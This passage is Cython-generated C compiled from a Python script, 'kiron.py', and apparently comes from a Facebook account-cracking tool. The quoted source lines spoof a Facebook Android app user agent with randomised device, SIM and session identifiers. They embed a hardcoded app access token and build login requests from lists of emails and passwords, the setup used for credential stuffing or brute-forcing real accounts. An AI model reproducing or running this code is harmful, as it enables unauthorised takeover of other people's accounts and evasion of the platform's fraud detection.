        __pyx_t_18 = __Pyx_PyObject_Str(__pyx_t_5); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_t_18); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBCR); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_v_fbcr); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBMF); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_v_fbmf); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBBD); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_v_fbbd); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBPN); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_v_fbpn); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBDV); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_v_fbdv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBSV); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_v_fbsv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBOP_19_FBCA); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_18, __pyx_v_fbca); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = PyNumber_Add(__pyx_t_5, __pyx_kp_s__83); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 600, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_ua, __pyx_t_18);
        __pyx_t_18 = 0;

        /* "kiron.py":601
 *                         fbpn = 'com.facebook.katana'
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
 *                         random_seed = random.Random()             # <<<<<<<<<<<<<<
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 *                         device_id = str(uuid.uuid4())
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_random); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 601, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_Random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 601, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_5, NULL};
          __pyx_t_18 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 601, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_18);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_random_seed, __pyx_t_18);
        __pyx_t_18 = 0;

        /* "kiron.py":602
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
 *                         random_seed = random.Random()
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))             # <<<<<<<<<<<<<<
 *                         device_id = str(uuid.uuid4())
 *                         secure = str(uuid.uuid4())
 */
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_v_random_seed, __pyx_n_s_choices); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 602, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_string); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 602, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_hexdigits); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 602, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyTuple_New(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 602, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_5);
        if (__Pyx_PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_5)) __PYX_ERR(0, 602, __pyx_L3_error);
        __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 602, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_k, __pyx_int_16) < 0) __PYX_ERR(0, 602, __pyx_L3_error)
        __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_18, __pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 602, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyString_Join(__pyx_kp_s__63, __pyx_t_12); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 602, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __pyx_t_12 = __Pyx_PyObject_Str(__pyx_t_5); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 602, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_adid, __pyx_t_12);
        __pyx_t_12 = 0;

        /* "kiron.py":603
 *                         random_seed = random.Random()
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 *                         device_id = str(uuid.uuid4())             # <<<<<<<<<<<<<<
 *                         secure = str(uuid.uuid4())
 *                         family = str(uuid.uuid4())
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_uuid); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 603, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 603, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_5, NULL};
          __pyx_t_12 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 603, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 603, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF_SET(__pyx_v_device_id, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "kiron.py":604
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 *                         device_id = str(uuid.uuid4())
 *                         secure = str(uuid.uuid4())             # <<<<<<<<<<<<<<
 *                         family = str(uuid.uuid4())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 */
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_uuid); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 604, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 604, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __pyx_t_12 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_12)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_12);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_12, NULL};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 604, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __pyx_t_5 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 604, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_secure, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":605
 *                         device_id = str(uuid.uuid4())
 *                         secure = str(uuid.uuid4())
 *                         family = str(uuid.uuid4())             # <<<<<<<<<<<<<<
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_uuid); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 605, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 605, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_12))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_12);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_12, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_4, NULL};
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_12, __pyx_callargs+1-__pyx_t_13, 0+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 605, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        }
        __pyx_t_12 = __Pyx_PyObject_Str(__pyx_t_5); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 605, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_family, __pyx_t_12);
        __pyx_t_12 = 0;

        /* "kiron.py":606
 *                         secure = str(uuid.uuid4())
 *                         family = str(uuid.uuid4())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'             # <<<<<<<<<<<<<<
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 *                         sim_serials = f'["{xd}"]'
 */
        __Pyx_INCREF(__pyx_kp_s_350685531728_62f8ce9f74b12f84c12);
        __Pyx_DECREF_SET(__pyx_v_accessToken, __pyx_kp_s_350685531728_62f8ce9f74b12f84c12);

        /* "kiron.py":607
 *                         family = str(uuid.uuid4())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))             # <<<<<<<<<<<<<<
 *                         sim_serials = f'["{xd}"]'
 *                         li = ['28','29','210']
 */
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_random_seed, __pyx_n_s_choices); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 607, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_string); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 607, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_digits); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 607, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyTuple_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 607, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_4);
        if (__Pyx_PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_4)) __PYX_ERR(0, 607, __pyx_L3_error);
        __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 607, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_k, __pyx_int_20) < 0) __PYX_ERR(0, 607, __pyx_L3_error)
        __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_t_5, __pyx_t_4); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 607, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyString_Join(__pyx_kp_s__63, __pyx_t_18); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 607, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 607, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_xd, __pyx_t_18);
        __pyx_t_18 = 0;

        /* "kiron.py":608
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 *                         sim_serials = f'["{xd}"]'             # <<<<<<<<<<<<<<
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 */
        __pyx_t_18 = PyTuple_New(3); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_22 = 0;
        __pyx_t_8 = 127;
        __Pyx_INCREF(__pyx_kp_u__84);
        __pyx_t_22 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__84);
        PyTuple_SET_ITEM(__pyx_t_18, 0, __pyx_kp_u__84);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_xd, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_8;
        __pyx_t_22 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_18, 1, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u__85);
        __pyx_t_22 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__85);
        PyTuple_SET_ITEM(__pyx_t_18, 2, __pyx_kp_u__85);
        __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_18, 3, __pyx_t_22, __pyx_t_8); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 608, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __Pyx_XDECREF_SET(__pyx_v_sim_serials, ((PyObject*)__pyx_t_4));
        __pyx_t_4 = 0;

        /* "kiron.py":609
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 *                         sim_serials = f'["{xd}"]'
 *                         li = ['28','29','210']             # <<<<<<<<<<<<<<
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(string.digits) for _ in range(2))
 */
        __pyx_t_4 = PyList_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 609, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_INCREF(__pyx_kp_s_28);
        __Pyx_GIVEREF(__pyx_kp_s_28);
        if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 0, __pyx_kp_s_28)) __PYX_ERR(0, 609, __pyx_L3_error);
        __Pyx_INCREF(__pyx_kp_s_29);
        __Pyx_GIVEREF(__pyx_kp_s_29);
        if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 1, __pyx_kp_s_29)) __PYX_ERR(0, 609, __pyx_L3_error);
        __Pyx_INCREF(__pyx_kp_s_210);
        __Pyx_GIVEREF(__pyx_kp_s_210);
        if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 2, __pyx_kp_s_210)) __PYX_ERR(0, 609, __pyx_L3_error);
        __Pyx_XDECREF_SET(__pyx_v_li, ((PyObject*)__pyx_t_4));
        __pyx_t_4 = 0;

        /* "kiron.py":610
 *                         sim_serials = f'["{xd}"]'
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)             # <<<<<<<<<<<<<<
 *                         j1 = ''.join(random.choice(string.digits) for _ in range(2))
 *                         jazoest = li2+j1
 */
        __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_random); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 610, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_choice); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 610, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = NULL;
        __pyx_t_13 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_18)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_18);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_13 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_18, __pyx_v_li};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_13, 1+__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 610, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_li2, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "kiron.py":611
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(string.digits) for _ in range(2))             # <<<<<<<<<<<<<<
 *                         jazoest = li2+j1
 *                         data = {
 */
        __pyx_t_4 = __pyx_pf_5kiron_4api2_genexpr(NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 611, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyString_Join(__pyx_kp_s__63, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 611, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_j1, ((PyObject*)__pyx_t_5));
        __pyx_t_5 = 0;

        /* "kiron.py":612
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(string.digits) for _ in range(2))
 *                         jazoest = li2+j1             # <<<<<<<<<<<<<<
 *                         data = {
 *                                 'adid':adid,
 */
        __pyx_t_5 = PyNumber_Add(__pyx_v_li2, __pyx_v_j1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 612, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_XDECREF_SET(__pyx_v_jazoest, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "kiron.py":614
 *                         jazoest = li2+j1
 *                         data = {
 *                                 'adid':adid,             # <<<<<<<<<<<<<<
 *                                 'format':'json',
 *                                 'device_id':device_id,
 */
        __pyx_t_5 = __Pyx_PyDict_NewPresized(25); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 614, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_adid, __pyx_v_adid) < 0) __PYX_ERR(0, 614, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_format, __pyx_n_s_json) < 0) __PYX_ERR(0, 614, __pyx_L3_error)

        /* "kiron.py":616
 *                                 'adid':adid,
 *                                 'format':'json',
 *                                 'device_id':device_id,             # <<<<<<<<<<<<<<
 *                                 'email':ids,
 *                                 'password':pas,
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_device_id, __pyx_v_device_id) < 0) __PYX_ERR(0, 614, __pyx_L3_error)

        /* "kiron.py":617
 *                                 'format':'json',
 *                                 'device_id':device_id,
 *                                 'email':ids,             # <<<<<<<<<<<<<<
 *                                 'password':pas,
 *                                 "session_id": str(uuid.uuid4()),
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_email, __pyx_v_ids) < 0) __PYX_ERR(0, 614, __pyx_L3_error)

        /* "kiron.py":618
 *                                 'device_id':device_id,
 *                                 'email':ids,
 *                                 'password':pas,             # <<<<<<<<<<<<<<
 *                                 "session_id": str(uuid.uuid4()),
 *                                 "advertiser_id": str(uuid.uuid4()),
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_password_2, __pyx_v_pas) < 0) __PYX_ERR(0, 614, __pyx_L3_error)

        /* "kiron.py":619
 *                                 'email':ids,
 *                                 'password':pas,
 *                                 "session_id": str(uuid.uuid4()),             # <<<<<<<<<<<<<<
 *                                 "advertiser_id": str(uuid.uuid4()),
 *                                 "reg_instance": str(uuid.uuid4()),
 */
        __Pyx_GetModuleGlobalName(__pyx_t_18, __pyx_n_s_uuid); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 619, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 619, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
